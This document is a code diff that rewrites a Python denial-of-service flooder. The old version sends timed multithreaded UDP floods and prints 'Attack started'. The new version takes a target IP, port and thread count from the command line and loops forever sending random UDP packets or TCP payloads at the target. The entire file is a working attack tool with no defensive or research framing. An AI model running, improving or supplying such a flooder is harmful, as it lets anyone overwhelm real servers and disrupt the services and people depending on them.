@@ -1,35 +1,55 @@
-import sys
-import socket
-import time
+import argparse
 import random
+import socket
 import threading
-import getpass
-import os
+
+ap = argparse.ArgumentParser()
+ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
+ap.add_argument("-p", "--port", required=True, type=int, help="Port")
+ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
+ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
+ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
+args = vars(ap.parse_args())
 
 
-def udpsender (host, port, timer, punch):
+ip = args['ip']
+port = args['port']
+choice = args['choice']
+times = args['times']
+threads = args['threads']
 
-	timeout = time.time() + float(timer)
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	print("Attack started to: " + host + ":" + str(port))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Sent!!!")
+		except:
+			print("[!] Error!!!")
 
-	while time.time() < timeout:
-		sock.sendto(punch, (host, int(port)))
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
 
-try:
-	ip = sys.argv[1]
-	port = int(sys.argv[2])
-	timer = sys.argv[3]
-	punch = random._urandom(int(sys.argv[4]))
-	threads = sys.argv[5]
-	print(port)
-	for x in range(int(threads)):
-		t = threading.Thread(target=udpsender, args=(ip, port, timer, punch,))
-		t.daemon = True
-		t.start()
-
-	time.sleep(int(timer))
-
-except IndexError:
-	print("Usage: python " + sys.argv[0] + " host port time packet_size threads")
-	print("Example: python "+sys.argv[0]+" 127.0.0.1 80 60 50000 10")
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
